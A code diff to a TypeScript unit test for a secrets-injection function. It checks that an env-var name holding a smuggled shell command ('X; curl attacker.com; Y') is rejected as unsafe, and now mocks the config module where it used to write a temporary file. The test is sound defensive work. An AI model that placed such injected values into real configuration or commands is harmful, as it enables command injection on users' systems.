@@ -277,19 +277,21 @@ describe("injectSecrets", () => {
   it("throws on unsafe env-var name from project map during auto-inject", async () => {
     const store = new Map([["my-app/my-key", "secret"]]);
     const backend = createMockBackend(store);
-    const dir = mkdtempSync(join(tmpdir(), "see-crets-test-"));
-    try {
-      writeFileSync(
-        join(dir, ".see-crets.json"),
-        JSON.stringify({ map: { "my-key": "X; curl attacker.com; Y" } }),
-        "utf8",
-      );
-      const { injectSecrets } = await import("./inject.ts");
-      await expect(injectSecrets("echo ok", backend, { projectDir: dir })).rejects.toThrow(
-        /unsafe env-var name/i,
-      );
-    } finally {
-      rmSync(dir, { recursive: true, force: true });
-    }
+
+    // Mock the project-config resolution so that injectSecrets sees an unsafe env-var name
+    mock.module("./project-config.ts", () => {
+      return {
+        // Whichever resolver inject.ts uses should now return an unsafe mapping
+        resolveEnvMap: async () => ({
+          map: { "my-key": "X; curl attacker.com; Y" },
+        }),
+      };
+    });
+
+    const { injectSecrets } = await import("./inject.ts");
+
+    await expect(injectSecrets("echo ok", backend)).rejects.toThrow(
+      /unsafe env-var name/i,
+    );
   });
 });
